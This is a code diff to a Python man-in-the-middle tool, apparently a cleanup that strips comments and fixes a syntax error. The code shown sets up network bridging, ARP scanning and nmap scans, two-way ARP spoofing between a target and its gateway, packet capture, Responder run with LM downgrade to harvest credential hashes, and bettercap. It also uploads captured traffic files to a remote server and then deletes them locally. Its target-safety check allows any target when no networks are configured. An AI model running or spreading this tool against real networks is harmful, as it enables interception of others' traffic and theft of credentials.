@@ -59,8 +59,7 @@ class MITMTool:
         """Load MAC vendor database for device identification"""
         try:
             # Download if file doesn't exist or is older than 30 days
-            if not os.path.exists(MAC_VENDOR_CACHE) or \
-               if not os.path.exists(MAC_VENDOR_CACHE) or (time.time() - os.path.getmtime(MAC_VENDOR_CACHE)) > 2592000:
+            if not os.path.exists(MAC_VENDOR_CACHE) or (time.time() - os.path.getmtime(MAC_VENDOR_CACHE)) > 2592000:
                 logger.info("Downloading MAC vendor database...")
                 urllib.request.urlretrieve(MAC_VENDOR_DB_URL, MAC_VENDOR_CACHE + ".new")
                 shutil.move(MAC_VENDOR_CACHE + ".new", MAC_VENDOR_CACHE)
@@ -81,12 +80,10 @@ class MITMTool:
         if not mac or not self.mac_vendors:
             return "Unknown"
         
-        # Standardize MAC format
         mac = mac.upper().replace('-', ':')
-        if len(mac) < 8:  # Need at least first 6 chars (OUI)
+        if len(mac) < 8:
             return "Unknown"
         
-        # Check first 6 chars (OUI)
         oui = mac[:8]
         if oui in self.mac_vendors:
             vendor = self.mac_vendors[oui]
@@ -114,12 +111,6 @@ class MITMTool:
                 return "Sony Device"
             elif "Microsoft" in vendor:
                 return "Microsoft Device"
-            elif "Huawei" in vendor:
-                return "Huawei Device"
-            elif "Intel" in vendor:
-                return "Intel Device"
-            elif "ASUS" in vendor:
-                return "ASUS Device"
             return vendor
         return "Unknown"
 
@@ -150,7 +141,6 @@ class MITMTool:
         
         The developers assume no liability for misuse of this software.
         """
-        
         print(disclaimer)
         
         if not self.config.get("legal_disclaimer_accepted", False):
@@ -158,7 +148,6 @@ class MITMTool:
             if response != "yes":
                 print("Exiting...")
                 sys.exit(0)
-            
             self.config["legal_disclaimer_accepted"] = True
             self.save_config()
 
@@ -232,18 +221,12 @@ class MITMTool:
         iface1, iface2 = ethernet_ifaces[:2]
         
         try:
-            # Disable IP on interfaces
             subprocess.run(["sudo", "ifconfig", iface1, "0.0.0.0"], check=True)
             subprocess.run(["sudo", "ifconfig", iface2, "0.0.0.0"], check=True)
-            
-            # Create bridge
             subprocess.run(["sudo", "brctl", "addbr", "mitm-bridge"], check=True)
             subprocess.run(["sudo", "brctl", "addif", "mitm-bridge", iface1], check=True)
             subprocess.run(["sudo", "brctl", "addif", "mitm-bridge", iface2], check=True)
-            
-            # Bring up bridge
             subprocess.run(["sudo", "ifconfig", "mitm-bridge", "up"], check=True)
-            
             logger.info(f"Successfully bridged {iface1} and {iface2} via mitm-bridge")
             return True
             
@@ -260,7 +243,6 @@ class MITMTool:
         interface = list(self.interfaces.keys())[0]
         
         try:
-            # ARP scan for live hosts
             logger.info("Running ARP scan...")
             arp_scan = subprocess.run(
                 ["sudo", "arp-scan", "--interface", interface, "--localnet"],
@@ -268,7 +250,6 @@ class MITMTool:
             )
             print(arp_scan.stdout)
             
-            # Nmap scan for services
             logger.info("Running Nmap scan...")
             subnet = self.get_subnet(interface)
             if subnet:
@@ -292,7 +273,6 @@ class MITMTool:
         if not ip or not netmask:
             return None
             
-        # Simple subnet calculation (for /24 networks)
         if netmask == "255.255.255.0":
             return ".".join(ip.split(".")[:3]) + ".0/24"
         return None
@@ -304,16 +284,11 @@ class MITMTool:
             return
             
         try:
-            # Enable IP forwarding
             subprocess.run(["sudo", "sysctl", "-w", "net.ipv4.ip_forward=1"], check=True)
-            
-            # Start arpspoof processes
             cmd1 = ["sudo", "arpspoof", "-i", "mitm-bridge", "-t", target_ip, gateway_ip]
             cmd2 = ["sudo", "arpspoof", "-i", "mitm-bridge", "-t", gateway_ip, target_ip]
-            
             self.capture_processes['arpspoof1'] = subprocess.Popen(cmd1)
             self.capture_processes['arpspoof2'] = subprocess.Popen(cmd2)
-            
             logger.info(f"ARP spoofing started between {target_ip} and {gateway_ip}")
             return True
             
@@ -324,7 +299,7 @@ class MITMTool:
     def check_target_safety(self, target_ip):
         """Check if target is in allowed networks"""
         if not self.config.get("allowed_networks"):
-            return True  # No restrictions configured
+            return True
             
         for network in self.config.get("allowed_networks", []):
             if target_ip.startswith(network):
@@ -341,9 +316,8 @@ class MITMTool:
             cmd = [
                 "sudo", "tcpdump", "-i", interface, 
                 "-w", filename, "-s", "0", 
-                "not port 22"  # Exclude SSH traffic
+                "not port 22"
             ]
-            
             self.capture_processes['tcpdump'] = subprocess.Popen(cmd)
             logger.info(f"Packet capture started on {interface}, saving to {filename}")
             return True
@@ -359,7 +333,6 @@ class MITMTool:
                 "sudo", "responder", "-I", interface,
                 "-w", "-d", "--lm"
             ]
-            
             self.capture_processes['responder'] = subprocess.Popen(cmd)
             logger.info(f"Responder started on {interface}")
             return True
@@ -372,10 +345,8 @@ class MITMTool:
         """Start bettercap with optional script"""
         try:
             cmd = ["sudo", "bettercap", "-iface", "mitm-bridge"]
-            
             if script_path and os.path.exists(script_path):
                 cmd.extend(["-eval", f"load {script_path}"])
-                
             self.capture_processes['bettercap'] = subprocess.Popen(cmd)
             logger.info("Bettercap started")
             return True
@@ -399,8 +370,6 @@ class MITMTool:
                     logger.error(f"Failed to stop {name}")
                     
         self.capture_processes = {}
-        
-        # Disable IP forwarding
         subprocess.run(["sudo", "sysctl", "-w", "net.ipv4.ip_forward=0"], check=False)
         logger.info("All attacks stopped")
 
@@ -411,7 +380,6 @@ class MITMTool:
             return False
             
         try:
-            # Find all capture files
             files = []
             for f in os.listdir(DATA_DIR):
                 if f.endswith(".pcap") or f.endswith(".log"):
@@ -421,7 +389,6 @@ class MITMTool:
                 logger.info("No capture files to upload")
                 return False
                 
-            # Upload each file
             for file_path in files:
                 with open(file_path, 'rb') as f:
                     files = {'file': (os.path.basename(file_path), f)}
@@ -433,7 +400,7 @@ class MITMTool:
                     
                     if response.status_code == 200:
                         logger.info(f"Successfully uploaded {file_path}")
-                        os.remove(file_path)  # Delete after successful upload
+                        os.remove(file_path)
                     else:
                         logger.error(f"Upload failed for {file_path}: {response.text}")
                         
@@ -449,7 +416,6 @@ class MITMTool:
             logger.info(f"Checking connected devices on {interface}...")
             devices = []
             
-            # Method 1: ARP table
             try:
                 arp_result = subprocess.run(
                     ["arp", "-a", "-i", interface],
@@ -459,7 +425,6 @@ class MITMTool:
             except Exception as e:
                 logger.warning(f"ARP scan failed: {str(e)}")
 
-            # Method 2: DHCP leases
             try:
                 with open('/var/lib/misc/dnsmasq.leases', 'r') as f:
                     dhcp_leases = f.readlines()
@@ -467,7 +432,6 @@ class MITMTool:
             except Exception as e:
                 logger.warning(f"DHCP leases read failed: {str(e)}")
 
-            # Method 3: nmap scan (active)
             try:
                 subnet = self.get_subnet(interface)
                 if subnet:
@@ -479,7 +443,6 @@ class MITMTool:
             except Exception as e:
                 logger.warning(f"Nmap scan failed: {str(e)}")
 
-            # Method 4: ping sweep (fallback)
             try:
                 if not devices and subnet:
                     ping_result = subprocess.run(
@@ -490,7 +453,6 @@ class MITMTool:
             except Exception as e:
                 logger.warning(f"Ping sweep failed: {str(e)}")
 
-            # Deduplicate devices by MAC address
             unique_devices = {}
             for device in devices:
                 if 'mac' in device and device['mac']:
@@ -642,7 +604,7 @@ class MITMTool:
             time.sleep(2)
             return
             
-        iface = wifi_ifaces[0]  # Use first WiFi interface
+        iface = wifi_ifaces[0]
         
         while True:
             self.show_wifi_menu()
@@ -665,7 +627,7 @@ class MITMTool:
                     if 'hostname' in dev:
                         print(f"   Hostname: {dev.get('hostname')}")
                     print(f"   Detected via: {dev.get('method')}")
-                    print("")  # Blank line between devices
+                    print("")
                 input("\nPress Enter to continue...")
                 
             elif choice == "3":
